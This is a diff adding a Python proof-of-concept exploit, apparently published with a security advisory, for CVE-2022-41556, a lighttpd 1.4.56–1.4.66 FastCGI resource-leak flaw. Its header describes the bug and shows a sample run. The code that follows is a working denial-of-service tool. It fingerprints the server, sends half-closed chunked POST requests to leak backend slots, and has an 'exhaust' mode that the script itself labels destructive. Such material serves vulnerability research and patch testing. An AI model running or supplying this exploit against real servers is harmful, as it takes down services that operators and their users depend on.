@@ -1,0 +1,218 @@
+#!/usr/bin/env python3
+#
+#
+# Lighttpd 1.4.56 - 1.4.66 Resource Leak Denial of Service PoC
+#
+#
+# Vendor: Glenn Strauss
+# Product web page: https://www.lighttpd.net
+# Affected version: 1.4.56 - 1.4.66
+# Fixed version: 1.4.67-1.fc35
+#
+# Summary: lighttpd (pronounced /lighty/) is a secure, fast,
+# compliant, and very flexible web server that has been optimized
+# for high-performance environments. lighttpd uses memory and
+# CPU efficiently and has lower resource use than other popular
+# web servers. Its advanced feature-set (FastCGI, CGI, Auth,
+# Output-Compression, URL-Rewriting and much more) make lighttpd
+# the perfect web server for all systems, small and large.
+#
+# Desc: CVE-2022-41556 is a resource exhaustion vulnerability
+# in lighttpd 1.4.56 - 1.4.66 affecting gateway backends such
+# as FastCGI. When handling an HTTP/1.1 request with chunked
+# transfer encoding and request-body streaming enabled, lighttpd
+# mishandles an anomalous client disconnect (RDHUP / half-closed
+# TCP connection) before the terminating chunk is sent. In this
+# state, the gateway handler can incorrectly return HANDLER_WAIT_FOR_EVENT
+# without transitioning to an error or cleanup path, leaving the
+# backend connection slot permanently allocated. By repeatedly
+# opening such malformed connections, an attacker can exhaust
+# available backend slots, causing new dynamic requests to hang
+# indefinitely and resulting in a denial of service that persists
+# until the server is restarted.
+#
+# ---------------------------------------------------------------
+# ./lightslot.py --port 88 -n 5 --delay 0.1 10.0.0.7 --fcgi-path /bus.php --exhaust
+#
+# o-o-o-o-o-o-o-o-o-o-o-o-o-o-o-o-o-o-o
+# | | | | | | | | | | | | | | | | | | |
+#  lighttpd FastCGI backend slot leak
+# _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+#
+# [+] Detected Server: lighttpd/1.4.64
+# [*] Target: http://10.0.0.7:88/bus.php
+# [+] [0] anomalous FastCGI request sent
+# [+] [1] anomalous FastCGI request sent
+# [+] [2] anomalous FastCGI request sent
+# [+] [3] anomalous FastCGI request sent
+# [+] [4] anomalous FastCGI request sent
+# [*] Injection phase complete
+# [*] Starting frontend probe
+# [PROBE] frontend response time: 5.062s
+# [PROBE] frontend response time: 17.047s
+# [*] Cleanup complete
+# [*] Test complete
+# ---------------------------------------------------------------
+#
+# Tested on: lighttpd 1.4.64
+#
+#
+# Exploit coded by Gjoko 'LiquidWorm' Krstic
+#                  @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-5968
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2026-5968.php
+# CVE ID: CVE-2022-41556
+# CVE URL: https://www.cve.org/CVERecord?id=CVE-2022-41556
+# Fix release changelog: https://www.lighttpd.net/2022/9/17/1.4.67/
+# Red Hat Bugzilla: https://bugzilla.redhat.com/show_bug.cgi?id=2130967
+#
+#
+# 23.01.2026
+#
+
+import threading
+import argparse#
+import socket###
+import time#####
+import sys######
+
+banerche = """
+o-o-o-o-o-o-o-o-o-o-o-o-o-o-o-o-o-o-o
+| | | | | | | | | | | | | | | | | | |
+ lighttpd FastCGI backend slot leak
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+"""
+class FastCGILeakTester:
+    def __init__(self, host, port, fcgi_path,
+                 conns, delay, detect_only):
+        self.detect_only = detect_only
+        self.fcgi_path = fcgi_path
+        self.conns = conns
+        self.delay = delay
+        self.running = True
+        self.sockets = []
+        self.host = host
+        self.port = port
+
+    def make_socket(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((self.host, self.port))
+        return s
+
+    def chunky_funk(self, cid):
+        try:
+            s = self.make_socket()
+            req = (
+                f"POST {self.fcgi_path} HTTP/1.1\r\n"
+                f"Host: {self.host}\r\n"
+                f"Transfer-Encoding: chunked\r\n"
+                f"Connection: keep-alive\r\n"
+                f"\r\n"
+            ).encode()
+            s.sendall(req)
+            s.sendall(b"4\r\ntest\r\n")
+            s.shutdown(socket.SHUT_WR)
+            self.sockets.append(s)
+            print(f"[+] [{cid}] anomalous FastCGI request sent")
+        except Exception as e:
+            print(f"[-] [{cid}] failed: {e}")
+
+    def run(self):
+        print(f"[*] Target: http://{self.host}:{self.port}{self.fcgi_path}")
+        print(f"[*] Mode: {'DETECT' if self.detect_only else 'EXHAUST'}")
+        for i in range(self.conns):
+            if not self.running:
+                break
+            t = threading.Thread(
+                target=self.chunky_funk,
+                args=(i,),
+                daemon=True
+            )
+            t.start()
+            time.sleep(self.delay)
+        print("[*] Injection phase complete")
+
+    def frontend_probe(self):
+        print("[*] Starting frontend probe")
+        while self.running:
+            try:
+                s = self.make_socket()
+                start = time.time()
+                s.sendall(b"GET / HTTP/1.0\r\n\r\n")
+                s.recv(64)
+                elapsed = time.time() - start
+                s.close()
+                print(f"[PROBE] frontend response time: {elapsed:.3f}s")
+            except Exception as e:
+                print(f"[PROBE] frontend failure: {e}")
+            time.sleep(3)
+
+    def cleanup(self):
+        self.running = False
+        for s in self.sockets:
+            try:
+                s.close()
+            except:
+                pass
+        print("[*] Cleanup complete")
+
+def check_lighty(host, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+        s.connect((host, port))
+        s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
+        resp = s.recv(512)
+        s.close()
+        for line in resp.split(b"\n"):
+            if b"Server:" in line and b"lighttpd" in line.lower():
+                print(f"[+] Detected {line.decode().strip()}")
+                return True
+        print("[-] lighttpd not detected")
+        return False
+    except Exception as e:
+        print(f"[-] connection failed: {e}")
+        return False
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("host")
+    parser.add_argument("--port", type=int, default=80)
+    parser.add_argument("--fcgi-path", default="/index.php",
+                        help="Must be FastCGI-backed")
+    parser.add_argument("-n", "--conns", type=int, default=5,
+                        help="Use small number for detection")
+    parser.add_argument("--delay", type=float, default=0.2)
+    parser.add_argument("--exhaust", action="store_true",
+                        help="Exhaust backend slots (DESTRUCTIVE)")
+    args = parser.parse_args()
+    print(banerche)
+    if not check_lighty(args.host, args.port):
+        sys.exit(1)
+    tester = FastCGILeakTester(
+        args.host,
+        args.port,
+        args.fcgi_path,
+        args.conns,
+        args.delay,
+        detect_only=not args.exhaust
+    )
+    try:
+        tester.run()
+        probe = threading.Thread(
+            target=tester.frontend_probe,
+            daemon=True
+        )
+        probe.start()
+        time.sleep(30)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        tester.cleanup()
+    print("[*] Test complete")
+
+if __name__ == "__main__":
+    main()
